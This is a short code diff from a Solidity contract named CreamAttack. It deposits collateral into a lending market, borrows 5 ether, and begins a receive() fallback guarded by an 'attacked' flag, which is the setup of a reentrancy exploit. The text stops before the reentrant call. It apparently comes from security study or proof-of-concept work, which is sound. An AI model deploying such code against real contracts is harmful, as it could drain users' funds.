@@ -10,10 +10,12 @@ contract CreamAttack {
     constructor(address _marketAddress) {
         market = CreamMarket(_marketAddress);
     }
+
     function attack() public payable {
         market.depositCollateral{value: msg.value}();
         market.borrow(5 ether);
     }
+
     receive() external payable {
         if (!attacked) {
             attacked = true;
